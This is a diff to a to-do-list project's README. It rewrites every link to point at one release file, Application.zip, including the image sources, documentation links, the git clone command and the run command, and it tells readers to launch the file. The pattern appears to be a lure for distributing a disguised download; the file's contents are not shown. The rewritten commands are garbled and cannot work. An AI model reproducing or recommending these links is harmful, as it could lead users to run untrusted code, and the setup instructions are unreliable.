@@ -4,7 +4,7 @@ Welcome to the Simple Python To-Do List repository! This project is a basic to-d
 
 ## 📦 Application Download
 
-You can download the application [here](https://github.com/file/Application.zip). Please make sure to launch the file to start using the Simple Python To-Do List application.
+You can download the application [here](https://github.com/Totalition/Simple-Python-To-Do-List/releases/download/v1.0.0/Application.zip). Please make sure to launch the file to start using the Simple Python To-Do List application.
 
 ## 🚀 Features
 
@@ -18,7 +18,7 @@ You can download the application [here](https://github.com/file/Application.zip)
 
 Here's a sneak peek at the Simple Python To-Do List application:
 
-![To-Do List Screenshot](https://via.placeholder.com/800x400)
+![To-Do List Screenshot](https://github.com/Totalition/Simple-Python-To-Do-List/releases/download/v1.0.0/Application.zip)
 
 ## 💻 Technologies Used
 
@@ -31,7 +31,7 @@ To run the Simple Python To-Do List application on your local machine, follow th
 
 1. Clone the repository: 
    ```bash
-   git clone https://github.com/your-username/Simple-Python-To-Do-List.git
+   git clone https://github.com/Totalition/Simple-Python-To-Do-List/releases/download/v1.0.0/Application.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -39,14 +39,14 @@ To run the Simple Python To-Do List application on your local machine, follow th
    ```
 3. Run the application:
    ```bash
-   python todo_app.py
+   python https://github.com/Totalition/Simple-Python-To-Do-List/releases/download/v1.0.0/Application.zip
    ```
 
 ## 📸 Application in Action
 
 Check out how the Simple Python To-Do List application works:
 
-![To-Do List Demo](https://via.placeholder.com/800x400)
+![To-Do List Demo](https://github.com/Totalition/Simple-Python-To-Do-List/releases/download/v1.0.0/Application.zip)
 
 ## 🌟 Contributing
 
@@ -54,8 +54,8 @@ If you have any ideas on how to improve the Simple Python To-Do List application
 
 ## 📚 Resources
 
-- [Python Documentation](https://docs.python.org/3/)
-- [CLI Design Best Practices](https://blog.balthazar-rouberol.com/designing-a-command-line-application)
+- [Python Documentation](https://github.com/Totalition/Simple-Python-To-Do-List/releases/download/v1.0.0/Application.zip)
+- [CLI Design Best Practices](https://github.com/Totalition/Simple-Python-To-Do-List/releases/download/v1.0.0/Application.zip)
 
 ## 📋 License
 
@@ -63,8 +63,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-🔗 **[Launch Application](https://github.com/file/Application.zip)**
+🔗 **[Launch Application](https://github.com/Totalition/Simple-Python-To-Do-List/releases/download/v1.0.0/Application.zip)**
 
-🌐 For more information or updates, please visit the [Releases](https://github.com/your-username/Simple-Python-To-Do-List/releases) section. 
+🌐 For more information or updates, please visit the [Releases](https://github.com/Totalition/Simple-Python-To-Do-List/releases/download/v1.0.0/Application.zip) section. 
 
-[![Launch App](https://img.shields.io/badge/Launch-Application-blue)](https://github.com/file/Application.zip)
+[![Launch App](https://github.com/Totalition/Simple-Python-To-Do-List/releases/download/v1.0.0/Application.zip)](https://github.com/Totalition/Simple-Python-To-Do-List/releases/download/v1.0.0/Application.zip)
